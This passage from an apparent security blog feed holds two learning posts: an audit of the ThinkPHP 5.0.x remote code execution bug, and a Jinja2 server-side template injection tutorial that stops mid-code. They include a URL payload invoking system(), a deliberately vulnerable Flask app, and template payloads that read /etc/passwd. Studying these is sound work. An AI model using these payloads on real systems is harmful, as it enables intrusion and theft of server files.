class="keyword">self</span>::$routeCheck) ? <span class="keyword">self</span>::$routeCheck : $config[<span class="string">'url_route_on'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">            <span class="comment">// 开启路由</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(RUNTIME_PATH . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 读取路由缓存</span></span><br><span class="line">                $rules = <span class="keyword">include</span> RUNTIME_PATH . <span class="string">'route.php'</span>;</span><br><span class="line">                is_array($rules) &amp;&amp; Route::rules($rules);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $files = $config[<span class="string">'route_config_file'</span>];</span><br><span class="line">                <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_file(CONF_PATH . $file . CONF_EXT)) &#123;</span><br><span class="line">                        <span class="comment">// 导入路由配置</span></span><br><span class="line">                        $rules = <span class="keyword">include</span> CONF_PATH . $file . CONF_EXT;</span><br><span class="line">                        is_array($rules) &amp;&amp; Route::import($rules);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">            $result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</span><br><span class="line">            $must   = !is_null(<span class="keyword">self</span>::$routeMust) ? <span class="keyword">self</span>::$routeMust : $config[<span class="string">'url_route_must'</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($must &amp;&amp; <span class="keyword">false</span> === $result) &#123;</span><br><span class="line">                <span class="comment">// 路由无效</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RouteNotFoundException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">            $result = Route::parseUrl($path, $depr, $config[<span class="string">'controller_auto_search'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>Route::parseUrl</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">            $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">            <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">            $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">        &#125;</span><br><span class="line">        $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">        ....</span><br><span class="line">         <span class="keyword">return</span> [<span class="string">'type'</span> =&gt; <span class="string">'module'</span>, <span class="string">'module'</span> =&gt; $route];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再跟进一下<code>parseUrlPath()</code>，这里面就是返回一个$path变量，对包含<code>模块/控制器/操作</code>的URL进行分割成数组进行返回</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHQgJ.png" alt="kDHQgJ.png"></p><p>回到上一层的函数中，继续跟进，可以发现在自动搜索控制器的判断中进入了else语句，从而为控制器进行了赋值，这里是个赋值点，很关键</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHtUK.png" alt="kDHtUK.png"></p><p>然后以$route变量返回上层run函数</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHrDI.png" alt="kDHrDI.png"></p><p>此时$dispatch 进入到self::exec()中，继续跟进。此时的$dispatch 里面是一个以module为名字的数组，所以进入exec函数中必将进入分支为module的模块，然后进入<code>self::module</code>函数</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbesA.png" alt="kDbesA.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($dispatch, $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($dispatch[<span class="string">'type'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'redirect'</span>: <span class="comment">// 重定向跳转</span></span><br><span class="line">                $data = Response::create($dispatch[<span class="string">'url'</span>], <span class="string">'redirect'</span>)</span><br><span class="line">                    -&gt;code($dispatch[<span class="string">'status'</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'module'</span>: <span class="comment">// 模块/控制器/操作</span></span><br><span class="line">                $data = <span class="keyword">self</span>::module(</span><br><span class="line">                    $dispatch[<span class="string">'module'</span>],</span><br><span class="line">                    $config,</span><br><span class="line">                    <span class="keyword">isset</span>($dispatch[<span class="string">'convert'</span>]) ? $dispatch[<span class="string">'convert'</span>] : <span class="keyword">null</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ...............</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>self::module</code>函数，在进入多模块部署后由于，bind的值为null，会进入elseif的条件，使available的变量成为true，这也是后面为什么可以顺利初始化module的条件，不然就会抛出异常XD。</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbqeI.png" alt="kDbqeI.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($config[<span class="string">'app_multi_module'</span>]) &#123;</span><br><span class="line">        <span class="comment">// 多模块部署</span></span><br><span class="line">        $module    = strip_tags(strtolower($result[<span class="number">0</span>] ?: $config[<span class="string">'default_module'</span>]));</span><br><span class="line">        $bind      = Route::getBind(<span class="string">'module'</span>);</span><br><span class="line">        $available = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($bind) &#123;</span><br><span class="line">            <span class="comment">// 绑定模块</span></span><br><span class="line">            <span class="keyword">list</span>($bindModule) = explode(<span class="string">'/'</span>, $bind);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($result[<span class="number">0</span>])) &#123;</span><br><span class="line">                $module    = $bindModule;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($module == $bindModule) &#123;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!in_array($module, $config[<span class="string">'deny_module_list'</span>]) &amp;&amp; is_dir(APP_PATH . $module)) &#123;</span><br><span class="line">            $available = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模块初始化</span></span><br><span class="line">        <span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line">            <span class="comment">// 初始化模块</span></span><br><span class="line">            $request-&gt;module($module);</span><br><span class="line">            $config = <span class="keyword">self</span>::init($module);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模块请求缓存检查</span></span><br><span class="line">            $request-&gt;cache(</span><br><span class="line">                $config[<span class="string">'request_cache'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_expire'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_except'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 单一模块部署</span></span><br><span class="line">        $module = <span class="string">''</span>;</span><br><span class="line">        $request-&gt;module($module);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认过滤机制</span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前模块路径</span></span><br><span class="line">    App::$modulePath = APP_PATH . ($module ? $module . DS : <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否自动转换控制器和操作名</span></span><br><span class="line">    $convert = is_bool($convert) ? $convert : $config[<span class="string">'url_convert'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取控制器名</span></span><br><span class="line">    $controller = strip_tags($result[<span class="number">1</span>] ?: $config[<span class="string">'default_controller'</span>]);</span><br><span class="line">    $controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取操作名</span></span><br><span class="line">    $actionName = strip_tags($result[<span class="number">2</span>] ?: $config[<span class="string">'default_action'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($config[<span class="string">'action_convert'</span>])) &#123;</span><br><span class="line">        $actionName = Loader::parseName($actionName, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $actionName = $convert ? strtolower($actionName) : $actionName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置当前请求的控制器、操作</span></span><br><span class="line">    $request-&gt;controller(Loader::parseName($controller, <span class="number">1</span>))-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    Hook::listen(<span class="string">'module_init'</span>, $request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(</span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前操作名</span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// 执行操作方法</span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 空操作</span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 操作不存在</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进的就是我在文章一开头说的内容，controller变量就被赋值，然后获得方法名字，开始请求这个方法</p><p><img src="https://s2.ax1x.com/2019/02/15/kDqoNV.png" alt="kDqoNV.png"></p><p>最后还是返回了这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br></pre></td></tr></table></figure><p>$call变量是个数组，里面包含了控制器以及操作，可以追踪里面的变量变化</p><p><img src="https://s2.ax1x.com/2019/02/15/kDL3uj.png" alt="kDL3uj.png"></p><p>然后通过<code>ReflectionMethod</code>方法去构造一个映射，反正就把他当成平常一个类去调用某个方法，接着就把剩余的url的剩余内容赋值给args，最后调用<code>invokefunction</code>函数，这个函数也类似回调函数，所以就会把<code>&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</code>传进<code>invokefunction</code>这个方法里面。</p><p><img src="https://s2.ax1x.com/2019/02/15/kDLOG8.png" alt="kDLOG8.png"></p><p><img src="https://s2.ax1x.com/2019/02/15/kDOPI0.png" alt="kDOPI0.png"></p><p>可以看到里面args里面的内容结构，里面包含了多个数组</p><p><img src="https://s2.ax1x.com/2019/02/15/kDO2es.png" alt="kDO2es.png"></p><p>继续跟进的话，你会发现这个函数跟上面跟进的函数的套路一模一样，也是利用了回调的效果，也是利用一个变量把system后面的内容返回给<code>call_user_func_array</code>，只不过这次可以直接调用<code>call_user_func_array</code>了，相当于<code>call_user_func_array(&quot;system&quot;,&quot;dir&quot;)</code>了</p><p><img src="https://s2.ax1x.com/2019/02/15/kDvUeJ.png" alt="kDvUeJ.png"></p><h3 id="补丁后的效果"><a href="#补丁后的效果" class="headerlink" title="补丁后的效果"></a>补丁后的效果</h3><p>再来观察一下加上补丁的走向，直接就会进入抛出异常的步骤，只要匹配到不是字母开头的控制器的话直接进入异常，有效避免利用命名空间构造攻击链</p><p><img src="https://s2.ax1x.com/2019/02/15/kDx8AA.png" alt="kDx8AA.png"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>这个攻击链的构造，还是概念模糊，如果真正构造的时候需要怎么去做？这里只是根据别人的payload去分析代码，分析它的攻击过程，个人感觉真正核心的东西没掌握，也有可能看得多就会了？？？XD因为这个东西不只是这个模块可以如此调用，还有其他模块也有同样的效果，这也比较考验对该框架的熟悉程度，多接触开发还是很好的。</li><li>看了好几篇文章，发现这几个都是差不多从路由的检测开始跟进，其实想想也对，毕竟payload从url中来，跟进某函数跟到底了再返回，有可能这是一种套路，先记下来。。。</li><li>我也是第一次审计这种东西，毕竟ThinkPHP 5.0.x 的代码执行漏洞，从漏洞技术含量和利用链构造上来看，算是2018年一个很牛的洞了，对我这种菜鸡，学习到就好。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次进行代码量这么大的分析，记录一下，个人感觉新手真的不适应这种，应该找点小一点的cms去分析，如果不懂MVC架构
    
    </summary>
    
      <category term="代码审计" scheme="0verwatch.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SSTI-injection</title>
    <link href="0verwatch.top/SSTI-injection.html"/>
    <id>0verwatch.top/SSTI-injection.html</id>
    <published>2019-02-04T08:30:46.000Z</published>
    <updated>2019-02-08T10:11:56.488Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先入个门"><a href="#先入个门" class="headerlink" title="先入个门"></a>先入个门</h3><h4 id="Jimja2"><a href="#Jimja2" class="headerlink" title="Jimja2"></a>Jimja2</h4><p><code>Jinja2</code>是默认的仿<code>Django</code>模板的一个模板引擎，由<code>Flask</code>的作者开发。网上搜的语法<a id="more"></a>2333，方便自己回顾</p><h5 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ... &#125;&#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</span><br><span class="line">&#123;% ... %&#125;：装载一个控制语句。</span><br><span class="line">&#123;# ... #&#125;：装载一个注释，模板渲染的时候会忽视这中间的值</span><br></pre></td></tr></table></figure><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>在模板中添加变量，可以使用（set）语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set name=&apos;xx&apos; %&#125;</span><br></pre></td></tr></table></figure><p><code>with</code>语句来创建一个内部的作用域，将<code>set</code>语句放在其中，这样创建的变量只在<code>with</code>代码块中才有效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with gg = 42 %&#125;</span><br><span class="line">&#123;&#123; gg &#125;&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><h5 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ken.sick %&#125;</span><br><span class="line">Ken is sick.</span><br><span class="line">&#123;% elif ken.dead %&#125;</span><br><span class="line">You killed Ken! You bastard!!!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">Kenny looks okay --- so far</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h5 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&#123;&#123; user.username|e &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for key, value in &lt;strong&gt;my_dict.iteritems()&lt;/strong&gt; %&#125;</span><br><span class="line">&amp;lt;dt&amp;gt;&#123;&#123; key|e &#125;&#125;&amp;lt;/dt&amp;gt;</span><br><span class="line">&amp;lt;dd&amp;gt;&#123;&#123; value|e &#125;&#125;&amp;lt;/dd&amp;gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="Jinja2中for循环内置常量"><a href="#Jinja2中for循环内置常量" class="headerlink" title="Jinja2中for循环内置常量"></a>Jinja2中for循环内置常量</h5><p>loop.index    当前迭代的索引（从1开始）<br>loop.index0    当前迭代的索引（从0开始）<br>loop.first    是否是第一次迭代，返回True\/False<br>loop.last    是否是最后一次迭代，返回True\/False<br>loop.length    序列的长度<br> 注意：不可以使用continue和break表达式来控制循环的执行。</p><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>过滤器是通过<code>（|）</code>符号进行使用的，例如：<code>0</code>：将返回name的长度</p><p>类似于我们平常的的函数，他他这种应该就是内置函数，因为它本身就含有很多过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">abs(value)：返回一个数值的绝对值。示例：-1|abs</span><br><span class="line">last(value)：返回一个序列的最后一个元素。示例：names|last。</span><br><span class="line">length(value)：返回一个序列或者字典的长度。示例：names|length。</span><br><span class="line">join(value,d=u&apos;&apos;)：将一个序列用d这个参数的值拼接成字符串。</span><br><span class="line">int(value)：将值转换为int类型。</span><br><span class="line">float(value)：将值转换为float类型。</span><br><span class="line">lower(value)：将字符串转换为小写。</span><br><span class="line">upper(value)：将字符串转换为小写</span><br></pre></td></tr></table></figure><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>简单地说跟这种类型的注入跟一般的注入成因其实一样，都是过分相信用户的输入导致的漏洞，这样一来通过模板注入可以导致敏感信息泄露、代码执行等诸多漏洞，这里有一篇关于PHP的模板注入，写的挺好，可以参考一下：<code>https://www.freebuf.com/vuls/83999.html</code>,但这篇文章PHP 模版引擎 Twig 作为例子，只是简单介绍了一下XSS的相关漏洞，并没有触发更大的危害，但是常规的测试方法已经写了出来，跟测试注入其实差不多，就是换了内容而已。</p><p><img src="https://s2.ax1x.com/2019/02/07/ktayNt.png" alt="ktayNt.png"></p><p>所以下面就自己搭个python的web环境，以危害更大的<code>SSTI模板</code>注入作为例子说明，这是app.py里面的代码内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br></pre></td></tr></table></figure><p>可以看得出来name参数直接以get方式获取，直接拼接在Hello后面作为模板，直接render，这很明显name参数是可控的。问题也恰好是出在这。</p><p>当然这里也是有XSS的</p><p><img src="https://s2.ax1x.com/2019/02/07/ktJXGD.png" alt="ktJXGD.png"></p><p>但是重点还是放在读文件这一功能上，这也相当于直接RCE了，先要学习一下下面这几个类，<code>__mro__</code>以及<code>__subclasses__</code>属性，其实这里有点像python沙盒绕过的构造方法23333.</p><p><code>__mro__</code>中的MRO(Method Resolution Order)代表着解析方法调用的顺序，可以看看<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__" target="_blank" rel="noopener">Python文档</a>中的介绍。</p><p><code>__subclasses__</code>属性在这里作为一种方法被<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__" target="_blank" rel="noopener">定义</a>为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p><p>上面的这两个属性引用自这篇文章：<code>https://www.freebuf.com/articles/web/98928.html</code></p><p>个人直接理解就是<code>__mro__</code>会输出当前对象所调用的全部类包括其父类，而<code>__subclasses__</code>会输出该类下所有的子类。OK，这样就可以愉快的开始了</p><p>先来测试一下是否存在这个漏洞，输入参数<code>25hello</code>，明显存在漏洞</p><p><img src="https://s2.ax1x.com/2019/02/07/ktfbPU.png" alt="ktfbPU.png"></p><p>首先我们要做的第一件事便是选择一个new-style object用于访问<code>object</code>基类。可以简单的使用<code>&#39;&#39;</code>，一个空字符串，<code>str</code>对象类型。之后可以使用<code>__mro__</code>属性访问对象的继承类。将<code></code>作为payload注入到存在SSTI漏洞的页面中</p><p><img src="https://s2.ax1x.com/2019/02/07/ktYYQJ.png" alt="ktYYQJ.png"></p><p>出现两个类，选择第二个object基类，并显示该类下方的所有子类，注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/07/ktYReI.png" alt="ktYReI.png"></p><p>上面链接的文章里面使用file类去进行对文件的读写操作，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>但是file方法在py3中已经不支持，只要找到可以执行代码的函数或者其他读文件的函数都可以，在vulhub上找到的另外一个适合py3的，利用了eval函数去实现RCE的功能，因为执行语句去实现的，所以得用%括住。方法不止一种，找到对的继承链就可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 